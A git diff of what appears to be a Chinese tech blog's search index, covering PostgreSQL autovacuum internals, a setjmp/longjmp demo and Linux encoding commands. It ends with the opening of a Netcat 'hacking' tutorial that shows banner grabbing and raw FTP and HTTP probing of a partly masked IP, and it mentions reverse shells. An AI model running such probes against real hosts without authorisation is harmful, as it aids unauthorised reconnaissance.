@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[Postgresql Vacuum进程]]></title>
     <url>%2F2020%2F01%2F15%2FPostgreSQL%2F2020-01-14-Postgresql-vacuum%2F</url>
-    <content type="text"><![CDATA[Postgresql数据库为了定时清理因为MVCC引入的垃圾数据，实现了自动清理的机制。[基于pg12] autovacuum launcher autovacuum worker 其中autovaucuum launcher主要负责调度worker,​ autovacuum worker进程进行具体的自动清理工作。 其中 visibility map[vm:PG8.4版本后增加]起到重要作用，通过为每个数据块设置标志位来标记哪些page是没有dead tuple.好处: vacuum 进行扫描时，可以跳过page。 index-only sacn，可以减少tuple的可见性判断, 减少IO操作. 提高性能。 autovacuum launcher​ …… 待更新… autovacuum workersrc/backend/postmaster/autovacuum.c:AutoVacWorkerMain(); 函数工作流程如下: 注册信号处理函数 BaseInit() 更新GUC参数配置 zero_damaged_pages 设置为 false statement_timeout 设置为 0 lock_timeout 设置为 0 idle_in_transaction_session_timeout 设置为 0 default_transaction_isolation 设置为 read committed，尽可能的减少死锁与堵塞其他事务的可能性。 synchronous_commit 设置为 local， 允许我们不接受备库的影响,能够进行正常的清理任务。 获取共享内存AutoVacuumShmem中av_startingWorker，并更新 dbid 和 MyWorkerInfo-&gt;wi_proc; 重新唤醒autovacuum launch; 获取 提交的最新xid 和 MultiXactId 执行do_autovacuum清理函数: =&gt; 从pg_class遍历所有表，进行清理工作 初始化上下文 更新统计信息 获取effective_multixact_freeze_max_age 设置default_freeze_min_age， default_freeze_table_age， default_multixact_freeze_min_age， default_multixact_freeze_table_age 开始遍历pg_class表记录，进行相应的逻辑处理 孤儿临时表， continue。 123if (classForm-&gt;relpersistence == RELPERSISTENCE_TEMP) if (!isTempNamespaceInUse(classForm-&gt;relnamespace)) orphan_oids = lappend_oid(orphan_oids, relid); 检查表 || [toase table] 是否需要vacuum &amp; analyzed &amp; multixact wraparound 过程如下:relation_needs_vacanalyze do_vacuum: 该表统计信息中标记为dead的tuple数量大于vac_base_thresh + vac_scale_factor * reltuples时。具体细节如下: 12345678910111213vactuples = tabentry-&gt;n_dead_tuples; //pgstat统计信息vac_base_thresh = (relopts &amp;&amp; relopts-&gt;vacuum_threshold &gt;= 0) ? relopts-&gt;vacuum_threshold : autovacuum_vac_thresh;vac_scale_factor = (relopts &amp;&amp; relopts-&gt;vacuum_scale_factor &gt;= 0) ? relopts-&gt;vacuum_scale_factor : autovacuum_vac_scale;vacthresh = (float4) vac_base_thresh + vac_scale_factor * reltuples;*dovacuum = force_vacuum || (vactuples &gt; vacthresh); do_analyze: 该表统计信息中上次analyze之后改变的元组数大于 anl_base_thresh + anl_scale_factor * reltuples时. 具体细节如下: 123456789101112anltuples = tabentry-&gt;changes_since_analyze; //pgstat统计信息anl_base_thresh = (relopts &amp;&amp; relopts-&gt;analyze_threshold &gt;= 0) ? relopts-&gt;analyze_threshold : autovacuum_anl_thresh;anl_scale_factor = (relopts &amp;&amp; relopts-&gt;analyze_scale_factor &gt;= 0) ? relopts-&gt;analyze_scale_factor : autovacuum_anl_scale;anlthresh = (float4) anl_base_thresh + anl_scale_factor * reltuples;*doanalyze = (anltuples &gt; anlthresh); do_multixact_wraparound:如果wraparound置为true，则将会强制执行do_vacuum;; 123456789101112131415xidForceLimit = recentXid - freeze_max_age; if (xidForceLimit &lt; FirstNormalTransactionId) xidForceLimit -= FirstNormalTransactionId;force_vacuum = (TransactionIdIsNormal(classForm-&gt;relfrozenxid) &amp;&amp; TransactionIdPrecedes(classForm-&gt;relfrozenxid, xidForceLimit)); if (!force_vacuum)&#123; multiForceLimit = recentMulti - multixact_freeze_max_age; if (multiForceLimit &lt; FirstMultiXactId) multiForceLimit -= FirstMultiXactId; force_vacuum = MultiXactIdIsValid(classForm-&gt;relminmxid) &amp;&amp; MultiXactIdPrecedes(classForm-&gt;relminmxid, multiForceLimit); &#125;*wraparound = force_vacuum; 获取需要进行vacuum or analyze的对象，存至table_oids;并进行遍历 加载最新的GUC参数 并检查当前运行的worker个数, 检查是否有其他worker进程对该relation进行清理, 如果有，则跳过，skipit 置为 true. 再次检查该relid是否需要清理, 并生成用于追踪的autovac_table结构。table_recheck_autovac 对所有的vacuum worker进行资源平衡 autovac_balance_cost 调用函数autovacuum_do_vac_analyze. 进行vacuum or analyze vacuum 入口点. 释放缓存，更新之前的MyWorkerInfo结构 更新该database的datfrozenxid: vac_update_datfrozenxid 结构体 autovac_table autovacuum利用共享内存AutoVacuumShmem获取并行worker运行情况。传递的autovac_tab结构体参数如下: 12345678910111213/* struct to keep track of tables to vacuum and/or analyze, after rechecking */typedef struct autovac_table&#123; Oid at_relid; VacuumParams at_params; double at_vacuum_cost_delay; int at_vacuum_cost_limit; bool at_dobalance; bool at_sharedrel; char *at_relname; char *at_nspname; char *at_datname;&#125; autovac_table; 其中的VacuumParams 123456789101112131415161718192021222324/* * Parameters customizing behavior of VACUUM and ANALYZE. * * Note that at least one of VACOPT_VACUUM and VACOPT_ANALYZE must be set * in options. */typedef struct VacuumParams&#123; int options; /* bitmask of VacuumOption */ int freeze_min_age; /* min freeze age, -1 to use default */ int freeze_table_age; /* age at which to scan whole table */ int multixact_freeze_min_age; /* min multixact freeze age, -1 to * use default */ int multixact_freeze_table_age; /* multixact age at which to scan * whole table */ bool is_wraparound; /* force a for-wraparound vacuum */ int log_min_duration; /* minimum execution threshold in ms at * which verbose logs are activated, -1 * to use default */ VacOptTernaryValue index_cleanup; /* Do index vacuum and cleanup, * default value depends on reloptions */ VacOptTernaryValue truncate; /* Truncate empty pages at the end, * default value depends on reloptions */&#125; VacuumParams; VacuumParams中options参数 定义了vacuum的操作类型. 1234567891011typedef enum VacuumOption&#123; VACOPT_VACUUM = 1 &lt;&lt; 0, /* do VACUUM */ VACOPT_ANALYZE = 1 &lt;&lt; 1, /* do ANALYZE */ VACOPT_VERBOSE = 1 &lt;&lt; 2, /* print progress info */ VACOPT_FREEZE = 1 &lt;&lt; 3, /* FREEZE option */ VACOPT_FULL = 1 &lt;&lt; 4, /* FULL (non-concurrent) vacuum */ VACOPT_SKIP_LOCKED = 1 &lt;&lt; 5, /* skip if cannot get lock */ VACOPT_SKIPTOAST = 1 &lt;&lt; 6, /* don't process the TOAST table, if any */ VACOPT_DISABLE_PAGE_SKIPPING = 1 &lt;&lt; 7 /* don't skip any pages */&#125; VacuumOption; vacuum针对单个relation 其工作流程如下: src/backend/commands/vacuum.c:vacuum() 123voidvacuum(List *relations, VacuumParams *params, BufferAccessStrategy bstrategy, bool isTopLevel) 传递tab0-&gt;at_params 校验vacuum类别; 检查param参数 更新pgstat统计信息 [在AutoVacuumWorkerProcess下,则跳过.] 12if ((params-&gt;options &amp; VACOPT_VACUUM) &amp;&amp; !IsAutoVacuumWorkerProcess()) pgstat_vacuum_stat(); 设置内存上下文 进行relations链表循环 VACOPT_VACUUM: 调用vacuum_rel函数 123if (params-&gt;options &amp; VACOPT_VACUUM) //vacuum flag - if (!vacuum_rel(vrel-&gt;oid, vrel-&gt;relation, params)) continue; 从此处我们看得出，默认的autovacuum 执行的是lazy vacuum: 只是将dead元组，标记为可用; 并不会进行碎片整理，释放交换给操作系统。 函数的主要流程如下: vacuum_rel—&gt;table_relation_vacuum-&gt;heap_vacuum_rel-&gt;lazy_scan_heap -&gt; {lazy_vacuum_index-&gt;index_bulk_delete, lazy_vacuum_heap-&gt;lazy_vacuum_page}; 确认表的可读性与操作性. 检查用户对表的操作权限. 检查relation-&gt;relkind 是否可操作的类型. 忽略其余的临时表. 将relation所有页面，标记dead元组为可用 ItemIdSetUnused, 并设置脏页，刷新到磁盘; 更新visibility map - 更新pgstat统计信息. VACOPT_ANALYZE: 调用analyze_rel函数…… 释放上下文, 并更新vac_update_datfrozenxid(); 12if ((params-&gt;options &amp; VACOPT_VACUUM) &amp;&amp; !IsAutoVacuumWorkerProcess()) vac_update_datfrozenxid(); 引申问题 lazy vacuum &amp; vacuum full区别 LAZY vacuum：只是找到dead的元组，把它们的状态标记为可用状态。但是它不进行空间合并。 12VACUUM t_user_info;VACUUM ANALYZE t_user_info; FULL vacuum：除了 LAZY vacuum，还进行空间合并,临时文件pg_temp_%u，因此它需要锁表。 12VACUUM FULL VERBOSE;VACUUM FULL t_user_info; TupleDesc &amp; Relation 本质数据结构的区别以及作用 1234567891011typedef struct TupleDescData&#123; int natts; /* number of attributes in the tuple */ Oid tdtypeid; /* composite type ID for tuple type */ int32 tdtypmod; /* typmod for tuple type */ int tdrefcount; /* reference count, or -1 if not counting */ TupleConstr *constr; /* constraints, or NULL if none */ /* attrs[N] is the description of Attribute Number N+1 */ FormData_pg_attribute attrs[FLEXIBLE_ARRAY_MEMBER];&#125; TupleDescData;typedef struct TupleDescData *TupleDesc; 此结构体是在后端间描述元组的结构. 表结构: pg_attribute 1234567891011121314tupdesc = CreateTemplateTupleDesc(6); //初始化构建; TupleDescInitEntry(tupdesc, (AttrNumber) 1, "name", TEXTOID, -1, 0); TupleDescInitEntry(tupdesc, (AttrNumber) 2, "statement", TEXTOID, -1, 0); TupleDescInitEntry(tupdesc, (AttrNumber) 3, "is_holdable", BOOLOID, -1, 0); TupleDescInitEntry(tupdesc, (AttrNumber) 4, "is_binary", BOOLOID, -1, 0); TupleDescInitEntry(tupdesc, (AttrNumber) 5, "is_scrollable", BOOLOID, -1, 0); TupleDescInitEntry(tupdesc, (AttrNumber) 6, "creation_time", TIMESTAMPTZOID, -1, 0); ..... 生成记录: 12345678910111213141516171819202122HeapTuple tuple;Relation rel;TupleDesc access_audit_desc;Datum new_record[Natts_pg_accessaudit_count];bool nulls[Natts_pg_accessaudit_count];rel = heap_open(AccessAuditID, RowExclusiveLock);access_audit_desc = RelationGetDescr(rel);MemSet(new_record, 1, sizeof(new_record));MemSet(nulls, false, sizeof(nulls));new_record[Anum_pg_accessaudit_tid - 1] = ObjectIdGetDatum(toid); //插入新的记录;new_record[Anum_pg_accessaudit_tname - 1] = get_rel_name(toid);new_record[Anum_pg_accessaudit_selectcount - 1] = UInt32GetDatum(1000);new_record[Anum_pg_accessaudit_insertcount - 1] = UInt32GetDatum(1000);new_record[Anum_pg_accessaudit_updatecount - 1] = UInt32GetDatum(1000);new_record[Anum_pg_accessaudit_deletecount - 1] = UInt32GetDatum(1000);tuple = heap_form_tuple(access_audit_desc, new_record, nulls);CatalogTupleInsert(rel, tuple);heap_freetuple(tuple);heap_close(rel, NoLock); …. 待更新… 配置参数1234567891011121314151617autovacuum_max_workersautovacuum_naptimeautovacuum_vacuum_thresholdautovacuum_analyze_thresholdautovacuum_vacuum_scale_factorautovacuum_analyze_scale_factorautovacuum_freeze_max_ageautovacuum_multixact_freeze_max_ageautovacuum_vacuum_cost_delayautovacuum_vacuum_cost_limitvacuum_freeze_min_agevacuum_freeze_table_agevacuum_multixact_freeze_min_agevacuum_multixact_freeze_table_agevacuum_cleanup_index_scale_factor .... 待更新... 链接Postgresql-Page-空间回收]]></content>
+    <content type="text"><![CDATA[Postgresql数据库为了定时清理因为MVCC引入的垃圾数据，实现了自动清理的机制。[基于pg12] autovacuum launcher autovacuum worker 其中autovaucuum launcher主要负责调度worker,​ autovacuum worker进程进行具体的自动清理工作。 其中 visibility map[vm:PG8.4版本后增加]起到重要作用，通过为每个数据块设置标志位来标记哪些page是没有dead tuple.好处: vacuum 进行扫描时，可以跳过page。 index-only sacn，可以减少tuple的可见性判断, 减少IO操作. 提高性能。 autovacuum launcher​ …… 待更新… autovacuum workersrc/backend/postmaster/autovacuum.c:AutoVacWorkerMain(); 函数工作流程如下: 注册信号处理函数 BaseInit() 更新GUC参数配置 zero_damaged_pages 设置为 false statement_timeout 设置为 0 lock_timeout 设置为 0 idle_in_transaction_session_timeout 设置为 0 default_transaction_isolation 设置为 read committed，尽可能的减少死锁与堵塞其他事务的可能性。 synchronous_commit 设置为 local， 允许我们不接受备库的影响,能够进行正常的清理任务。 获取共享内存AutoVacuumShmem中av_startingWorker，并更新 dbid 和 MyWorkerInfo-&gt;wi_proc; 重新唤醒autovacuum launch; 获取 提交的最新xid 和 MultiXactId 执行do_autovacuum清理函数: =&gt; 从pg_class遍历所有表，进行清理工作 初始化上下文 更新统计信息 获取effective_multixact_freeze_max_age 设置default_freeze_min_age， default_freeze_table_age， default_multixact_freeze_min_age， default_multixact_freeze_table_age 开始遍历pg_class表记录，进行相应的逻辑处理 孤儿临时表， continue。 123if (classForm-&gt;relpersistence == RELPERSISTENCE_TEMP) if (!isTempNamespaceInUse(classForm-&gt;relnamespace)) orphan_oids = lappend_oid(orphan_oids, relid); 检查表 || [toase table] 是否需要vacuum &amp; analyzed &amp; multixact wraparound 过程如下:relation_needs_vacanalyze do_vacuum: 该表统计信息中标记为dead的tuple数量大于vac_base_thresh + vac_scale_factor * reltuples时。具体细节如下: 12345678910111213vactuples = tabentry-&gt;n_dead_tuples; //pgstat统计信息vac_base_thresh = (relopts &amp;&amp; relopts-&gt;vacuum_threshold &gt;= 0) ? relopts-&gt;vacuum_threshold : autovacuum_vac_thresh;vac_scale_factor = (relopts &amp;&amp; relopts-&gt;vacuum_scale_factor &gt;= 0) ? relopts-&gt;vacuum_scale_factor : autovacuum_vac_scale;vacthresh = (float4) vac_base_thresh + vac_scale_factor * reltuples;*dovacuum = force_vacuum || (vactuples &gt; vacthresh); do_analyze: 该表统计信息中上次analyze之后改变的元组数大于 anl_base_thresh + anl_scale_factor * reltuples时. 具体细节如下: 123456789101112anltuples = tabentry-&gt;changes_since_analyze; //pgstat统计信息anl_base_thresh = (relopts &amp;&amp; relopts-&gt;analyze_threshold &gt;= 0) ? relopts-&gt;analyze_threshold : autovacuum_anl_thresh;anl_scale_factor = (relopts &amp;&amp; relopts-&gt;analyze_scale_factor &gt;= 0) ? relopts-&gt;analyze_scale_factor : autovacuum_anl_scale;anlthresh = (float4) anl_base_thresh + anl_scale_factor * reltuples;*doanalyze = (anltuples &gt; anlthresh); do_multixact_wraparound:如果wraparound置为true，则将会强制执行do_vacuum;; 123456789101112131415xidForceLimit = recentXid - freeze_max_age; if (xidForceLimit &lt; FirstNormalTransactionId) xidForceLimit -= FirstNormalTransactionId;force_vacuum = (TransactionIdIsNormal(classForm-&gt;relfrozenxid) &amp;&amp; TransactionIdPrecedes(classForm-&gt;relfrozenxid, xidForceLimit)); if (!force_vacuum)&#123; multiForceLimit = recentMulti - multixact_freeze_max_age; if (multiForceLimit &lt; FirstMultiXactId) multiForceLimit -= FirstMultiXactId; force_vacuum = MultiXactIdIsValid(classForm-&gt;relminmxid) &amp;&amp; MultiXactIdPrecedes(classForm-&gt;relminmxid, multiForceLimit); &#125;*wraparound = force_vacuum; 获取需要进行vacuum or analyze的对象，存至table_oids;并进行遍历 加载最新的GUC参数 并检查当前运行的worker个数, 检查是否有其他worker进程对该relation进行清理, 如果有，则跳过，skipit 置为 true. 再次检查该relid是否需要清理, 并生成用于追踪的autovac_table结构。table_recheck_autovac 对所有的vacuum worker进行资源平衡 autovac_balance_cost 调用函数autovacuum_do_vac_analyze. 进行vacuum or analyze vacuum 入口点. 释放缓存，更新之前的MyWorkerInfo结构 更新该database的datfrozenxid: vac_update_datfrozenxid 结构体 autovac_table autovacuum利用共享内存AutoVacuumShmem获取并行worker运行情况。传递的autovac_tab结构体参数如下: 12345678910111213/* struct to keep track of tables to vacuum and/or analyze, after rechecking */typedef struct autovac_table&#123; Oid at_relid; VacuumParams at_params; double at_vacuum_cost_delay; int at_vacuum_cost_limit; bool at_dobalance; bool at_sharedrel; char *at_relname; char *at_nspname; char *at_datname;&#125; autovac_table; 其中的VacuumParams 123456789101112131415161718192021222324/* * Parameters customizing behavior of VACUUM and ANALYZE. * * Note that at least one of VACOPT_VACUUM and VACOPT_ANALYZE must be set * in options. */typedef struct VacuumParams&#123; int options; /* bitmask of VacuumOption */ int freeze_min_age; /* min freeze age, -1 to use default */ int freeze_table_age; /* age at which to scan whole table */ int multixact_freeze_min_age; /* min multixact freeze age, -1 to * use default */ int multixact_freeze_table_age; /* multixact age at which to scan * whole table */ bool is_wraparound; /* force a for-wraparound vacuum */ int log_min_duration; /* minimum execution threshold in ms at * which verbose logs are activated, -1 * to use default */ VacOptTernaryValue index_cleanup; /* Do index vacuum and cleanup, * default value depends on reloptions */ VacOptTernaryValue truncate; /* Truncate empty pages at the end, * default value depends on reloptions */&#125; VacuumParams; VacuumParams中options参数 定义了vacuum的操作类型. 1234567891011typedef enum VacuumOption&#123; VACOPT_VACUUM = 1 &lt;&lt; 0, /* do VACUUM */ VACOPT_ANALYZE = 1 &lt;&lt; 1, /* do ANALYZE */ VACOPT_VERBOSE = 1 &lt;&lt; 2, /* print progress info */ VACOPT_FREEZE = 1 &lt;&lt; 3, /* FREEZE option */ VACOPT_FULL = 1 &lt;&lt; 4, /* FULL (non-concurrent) vacuum */ VACOPT_SKIP_LOCKED = 1 &lt;&lt; 5, /* skip if cannot get lock */ VACOPT_SKIPTOAST = 1 &lt;&lt; 6, /* don't process the TOAST table, if any */ VACOPT_DISABLE_PAGE_SKIPPING = 1 &lt;&lt; 7 /* don't skip any pages */&#125; VacuumOption; vacuum针对单个relation 其工作流程如下: src/backend/commands/vacuum.c:vacuum() 123voidvacuum(List *relations, VacuumParams *params, BufferAccessStrategy bstrategy, bool isTopLevel) 传递tab0-&gt;at_params 校验vacuum类别; 检查param参数 更新pgstat统计信息 [在AutoVacuumWorkerProcess下,则跳过.] 12if ((params-&gt;options &amp; VACOPT_VACUUM) &amp;&amp; !IsAutoVacuumWorkerProcess()) pgstat_vacuum_stat(); 设置内存上下文 进行relations链表循环 VACOPT_VACUUM: 调用vacuum_rel函数 123if (params-&gt;options &amp; VACOPT_VACUUM) //vacuum flag - if (!vacuum_rel(vrel-&gt;oid, vrel-&gt;relation, params)) continue; 从此处我们看得出，默认的autovacuum 执行的是lazy vacuum: 只是将dead元组，标记为可用; 并不会进行碎片整理，释放交换给操作系统。 函数的主要流程如下: vacuum_rel—&gt;table_relation_vacuum-&gt;heap_vacuum_rel-&gt;lazy_scan_heap -&gt; {lazy_vacuum_index-&gt;index_bulk_delete, lazy_vacuum_heap [循环page/更新fsm]-&gt;lazy_vacuum_page}; 确认表的可读性与操作性. 检查用户对表的操作权限. 检查relation-&gt;relkind 是否可操作的类型. 忽略其余的临时表. 将relation所有页面，标记dead元组为可用 ItemIdSetUnused, 并设置脏页，刷新到磁盘; 更新visibility map. 更新pgstat统计信息. VACOPT_ANALYZE: 调用analyze_rel函数…… 释放上下文, 并更新vac_update_datfrozenxid(); 12if ((params-&gt;options &amp; VACOPT_VACUUM) &amp;&amp; !IsAutoVacuumWorkerProcess()) vac_update_datfrozenxid(); 引申问题 lazy vacuum &amp; vacuum full区别 LAZY vacuum：只是找到dead的元组，把它们的状态标记为可用状态。但是它不进行空间合并。 12VACUUM t_user_info;VACUUM ANALYZE t_user_info; FULL vacuum：除了 LAZY vacuum，还进行空间合并,临时文件pg_temp_%u，因此它需要锁表。 12VACUUM FULL VERBOSE;VACUUM FULL t_user_info; TupleDesc &amp; Relation 本质数据结构的区别以及作用 1234567891011typedef struct TupleDescData&#123; int natts; /* number of attributes in the tuple */ Oid tdtypeid; /* composite type ID for tuple type */ int32 tdtypmod; /* typmod for tuple type */ int tdrefcount; /* reference count, or -1 if not counting */ TupleConstr *constr; /* constraints, or NULL if none */ /* attrs[N] is the description of Attribute Number N+1 */ FormData_pg_attribute attrs[FLEXIBLE_ARRAY_MEMBER];&#125; TupleDescData;typedef struct TupleDescData *TupleDesc; 此结构体是在后端间描述元组的结构. 表结构: pg_attribute 1234567891011121314tupdesc = CreateTemplateTupleDesc(6); //初始化构建; TupleDescInitEntry(tupdesc, (AttrNumber) 1, "name", TEXTOID, -1, 0); TupleDescInitEntry(tupdesc, (AttrNumber) 2, "statement", TEXTOID, -1, 0); TupleDescInitEntry(tupdesc, (AttrNumber) 3, "is_holdable", BOOLOID, -1, 0); TupleDescInitEntry(tupdesc, (AttrNumber) 4, "is_binary", BOOLOID, -1, 0); TupleDescInitEntry(tupdesc, (AttrNumber) 5, "is_scrollable", BOOLOID, -1, 0); TupleDescInitEntry(tupdesc, (AttrNumber) 6, "creation_time", TIMESTAMPTZOID, -1, 0); ..... 生成记录: 12345678910111213141516171819202122HeapTuple tuple;Relation rel;TupleDesc access_audit_desc;Datum new_record[Natts_pg_accessaudit_count];bool nulls[Natts_pg_accessaudit_count];rel = heap_open(AccessAuditID, RowExclusiveLock);access_audit_desc = RelationGetDescr(rel);MemSet(new_record, 1, sizeof(new_record));MemSet(nulls, false, sizeof(nulls));new_record[Anum_pg_accessaudit_tid - 1] = ObjectIdGetDatum(toid); //插入新的记录;new_record[Anum_pg_accessaudit_tname - 1] = get_rel_name(toid);new_record[Anum_pg_accessaudit_selectcount - 1] = UInt32GetDatum(1000);new_record[Anum_pg_accessaudit_insertcount - 1] = UInt32GetDatum(1000);new_record[Anum_pg_accessaudit_updatecount - 1] = UInt32GetDatum(1000);new_record[Anum_pg_accessaudit_deletecount - 1] = UInt32GetDatum(1000);tuple = heap_form_tuple(access_audit_desc, new_record, nulls);CatalogTupleInsert(rel, tuple);heap_freetuple(tuple);heap_close(rel, NoLock); …. 待更新… 配置参数1234567891011121314151617autovacuum_max_workersautovacuum_naptimeautovacuum_vacuum_thresholdautovacuum_analyze_thresholdautovacuum_vacuum_scale_factorautovacuum_analyze_scale_factorautovacuum_freeze_max_ageautovacuum_multixact_freeze_max_ageautovacuum_vacuum_cost_delayautovacuum_vacuum_cost_limitvacuum_freeze_min_agevacuum_freeze_table_agevacuum_multixact_freeze_min_agevacuum_multixact_freeze_table_agevacuum_cleanup_index_scale_factor .... 待更新... 链接Postgresql-Page-空间回收]]></content>
       <categories>
         <category>Database</category>
       </categories>
@@ -109,8 +109,8 @@
         <category>工具</category>
       </categories>
       <tags>
-        <tag>C/C++</tag>
         <tag>Linux</tag>
+        <tag>C/C++</tag>
       </tags>
   </entry>
   <entry>
@@ -215,9 +215,9 @@
         <category>Debug</category>
       </categories>
       <tags>
-        <tag>Postgresql</tag>
         <tag>Linux</tag>
         <tag>Commands</tag>
+        <tag>Postgresql</tag>
       </tags>
   </entry>
   <entry>
@@ -240,8 +240,8 @@
         <category>LeetCode</category>
       </categories>
       <tags>
-        <tag>C/C++</tag>
         <tag>Algorithm</tag>
+        <tag>C/C++</tag>
       </tags>
   </entry>
   <entry>
@@ -606,8 +606,8 @@
     <url>%2F2018%2F02%2F27%2Fcpluscplus%2FLinux-setjmp-longjmp%2F</url>
     <content type="text"><![CDATA[错误处理是任何语言都需要解决的问题，任何语言都不能保证100%的正确运行，都需要异常机制的存在，例如c++ 的try ... catch , c 语言因此提供 setjmp 与 longjmp 来实现 内存堆栈的跳转。 实现一种非本地局部跳转的机制, 本地局部跳转如:goto 函数定义12int setjmp(jmp_buf jb);void longjmp(jmp_buf jb, int r); setjmp 用于保存程序的运行时堆栈环境 cs:ip 寄存器; longjmp 恢复先前程序中调用setjmp 函数所保存的堆栈环境; 示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152[Postgres@yfslcentos71 code]$ cat jmp.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;setjmp.h&gt;jmp_buf jb;void f1()&#123; printf(&quot;进入f1()\n&quot;); //if(0/*正确执行*/)&#123; &#125; if(1/*正确执行*/)&#123; printf(&quot;F1 正确执行\n&quot;); &#125; else &#123; printf(&quot;F1 执行错误\n&quot;); longjmp(jb,1); &#125; printf(&quot;退出f1()\n&quot;);&#125;void f2()&#123; printf(&quot;进入f2()\n&quot;); if(0/*正确执行*/) &#123; printf(&quot;F2 正确执行\n&quot;); &#125; else &#123; printf(&quot;F2 执行错误\n&quot;); longjmp(jb, 2); &#125; printf(&quot;退出f2()\n&quot;);&#125;int main()&#123; int r = setjmp(jb); printf(&quot;longjmp 返回值 r = %d\n&quot;, r); if(r==0)&#123; f1(); f2(); &#125;else if(r==1)&#123; printf(&quot;else if 1 返回值 r = %d\n&quot;, r); printf(&quot;处理错误1\n&quot;); exit(1); &#125;else if(r==2)&#123; printf(&quot;else if 2 返回值 r = %d\n&quot;, r); printf(&quot;处理错误2\n&quot;); exit(2); &#125; printf(&quot;所有函数执行完毕, 程序结束\n&quot;); return 0;&#125; 输出结果 12345678910[Postgres@yfslcentos71 code]$ ./jmp longjmp 返回值 r = 0 &lt;==&gt; 初始执行 返回值 为 0;进入f1()F1 正确执行退出f1()进入f2() F2 执行错误 &lt;==&gt; longjmp 跳转;longjmp 返回值 r = 2 &lt;==&gt; 重新返回 setjmp 处，其r值即为longjmp的第二参数;else if 2 返回值 r = 2 &lt;==&gt; 执行 else if 语句处理错误2]]></content>
       <tags>
-        <tag>C/C++</tag>
         <tag>Linux</tag>
+        <tag>C/C++</tag>
       </tags>
   </entry>
   <entry>
@@ -684,8 +684,8 @@
         <category>Kernel</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>Arm</tag>
+        <tag>Linux</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -773,8 +773,8 @@
         <category>Kernel</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>Arm</tag>
+        <tag>Linux</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -806,8 +806,8 @@
         <category>Kernel</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>Arm</tag>
+        <tag>Linux</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -842,8 +842,8 @@
         <category>Kernel</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>Arm</tag>
+        <tag>Linux</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -1043,8 +1043,8 @@
         <category>Kernel</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>Arm</tag>
+        <tag>Linux</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -1056,8 +1056,8 @@
         <category>Kernel</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>Arm</tag>
+        <tag>Linux</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -1218,6 +1218,19 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[Linux 字符编码 查看与转换]]></title>
+    <url>%2F2017%2F07%2F09%2Fcommands%2FLinux_encoding%2F</url>
+    <content type="text"><![CDATA[不同操作系统之间的换行表现形式不同需要常用编码转化 以及 文件转码; Linux 查看文件编码格式 Vim 查看文件编码 1set fileencoding // 即可显示文件编码格式 若想解决Vim查看文件乱码问题， 可以在 .vimrc 文件添加 1set encoding=utf-8 fileencoding=utf-8, cp936,gb2312 等 enca (yum install enca) 查看文件编码 1enca filename // enca对某些GBK编码文件并不识别 Unrecognized encoding 文件编码转化 Vim直接转化文件编码1set fileencoding=utf-8 iconv 1iconv -f encoding -t encoding inputfile 例如: 将一个utf-8 编码转化为GBK编码 1iconv -f utf-8 -t gbk file -o file2 1234567891011121314151617181920iconv命令用于转换指定文件的编码,默认输出到标准输出设备,亦可指定输出文件。 用法： iconv [选项...] [文件...] 有如下选项可用: 输入/输出格式规范： -f, --from-code=名称 原始文本编码 -t, --to-code=名称 输出编码 信息： -l, --list 列举所有已知的字符集 输出控制： -c 从输出中忽略无效的字符 -o, --output=FILE 输出文件 -s, --silent 关闭警告 --verbose 打印进度信息 -?, --help 给出该系统求助列表 --usage 给出简要的用法信息 -V, --version 打印程序版本号 例子: iconv -f utf-8 -t gb2312 aaa.txt &gt;bbb.txt 这个命令读取aaa.txt文件，从utf-8编码转换为gb2312编码,其输出定向到bbb.txt文件。 enconv将一个GBK编码转化为 utf-8编码 1enconv -L zh_CN -x utf-8 filename dos2unix : window 文件 cpoy 到 linux 格式转化 DOS下的文本文件是以\r\n作为断行标志的 Mac文本是以 \r 作为换行标志 Linux文本以 \n 作为换行标志 1dos2unix filename]]></content>
+      <categories>
+        <category>命令</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Commands</tag>
+        <tag>Vim</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Netcat 网络攻击 以及 应用]]></title>
     <url>%2F2017%2F07%2F09%2Fkali%2FNetCat%E5%AD%A6%E4%B9%A0%E4%BB%8B%E7%BB%8D%2F</url>
     <content type="text"><![CDATA[1.用Netcat进行黑客攻击第1部分：基础知识Netcat是一个很好的网络实用程序，用于使用TCP和UPD协议读取和写入网络连接。Netcat通常被称为网络工具中的瑞士军刀，我们将在使用黑客教程的不同教程中大量使用它。Netcat最常见的用途是设置反向和绑定shell，管道和重定向网络流量，端口侦听，调试程序和脚本以及Banner抓取。在本教程中，我们将学习如何使用Netcat的基本功能，如： Banner抓取 原始连接 Web服务器交互 1.1 Netcat Banner获取使用以下命令来获取服务器Banner（与服务建立原始连接）： nc [ip address] [port] 我们来试试这个在21端口运行的Metasploitable 2上的FTP服务： nc 192.168.1.100 21 nc [ip] [port]用于与端口进行原始连接，当可用时将返回服务器Banner。 code: rocky@kail: nc 23.105.202.xx 21 # 21 ftp 控制链接 220 (vsFTPd 2.2.2) # 系统服务 banner 1.2 Netcat原连接为了演示原始连接的工作原理，我们将在FTP服务连接到目标主机后发出一些FTP命令。 在匿名的情况下，我们来看看这个FTP服务器是否允许匿名访问，通过USER和PASS命令。 12345code: rocky@kail: nc 23.105.202.xx 21 220 (vsFTPd 2.2.2) user Postgres 331 Please specify the password. 1.3 Web服务器交互Netcat还可以通过发出HTTP请求与Web服务器进行交互。 通过以下命令，我们可以抓住在Metasploitable 2上运行的Web服务的Banner： nc 23.105.202.xx 80 然后运行此HTTP请求： HEAD / HTTP / 1.0 rocky@kail: nc 23.105.202.xx 80 HEAD / HTTP / 1.0 &lt;&lt; 输入 HTTP/1.1 400 Bad Request 